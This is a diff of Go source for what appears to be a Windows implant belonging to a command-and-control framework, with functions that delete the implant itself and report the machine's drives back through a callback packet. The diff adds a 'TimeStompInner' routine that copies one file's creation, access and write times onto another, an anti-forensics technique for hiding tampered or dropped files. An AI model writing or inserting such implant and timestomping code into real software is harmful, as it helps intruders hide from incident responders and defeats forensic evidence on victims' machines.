@@ -31,6 +31,7 @@ func DeleteSelf() {
 	}
 }
 
+// maybe need to be checked
 func listDrivesInner(b []byte) error {
 	bitMask, err := windows.GetLogicalDrives()
 	if err != nil {
@@ -49,6 +50,34 @@ func listDrivesInner(b []byte) error {
 	}
 	packet.PushResult(packet.CALLBACK_PENDING, util.BytesCombine(b[0:4], result))
 	return nil
+}
+
+func TimeStompInner(b []byte) error {
+	to, from, err := parseTimeStomp(b)
+	if err != nil {
+		return err
+	}
+	fromPtr := windows.StringToUTF16Ptr(string(from))
+	toPtr := windows.StringToUTF16Ptr(string(to))
+	fromHandle, err := windows.CreateFile(fromPtr, windows.GENERIC_READ, 0, nil, windows.OPEN_EXISTING, windows.FILE_ATTRIBUTE_NORMAL, windows.InvalidHandle)
+	if err != nil {
+		return err
+	}
+	defer windows.CloseHandle(fromHandle)
+	toHandle, err := windows.CreateFile(toPtr, windows.GENERIC_WRITE, 0, nil, windows.OPEN_EXISTING, windows.FILE_ATTRIBUTE_NORMAL, windows.InvalidHandle)
+	if err != nil {
+		return err
+	}
+	defer windows.CloseHandle(toHandle)
+	var creationTime = &windows.Filetime{}
+	var lastAccessTime = &windows.Filetime{}
+	var lastWriteTime = &windows.Filetime{}
+	_, _, err = getFileTime.Call(uintptr(fromHandle), uintptr(unsafe.Pointer(creationTime)), uintptr(unsafe.Pointer(lastAccessTime)), uintptr(unsafe.Pointer(lastWriteTime)))
+	if err != nil && err != windows.NTE_OP_OK {
+		return err
+	}
+	err = windows.SetFileTime(toHandle, creationTime, lastAccessTime, lastWriteTime)
+	return err
 }
 
 /*
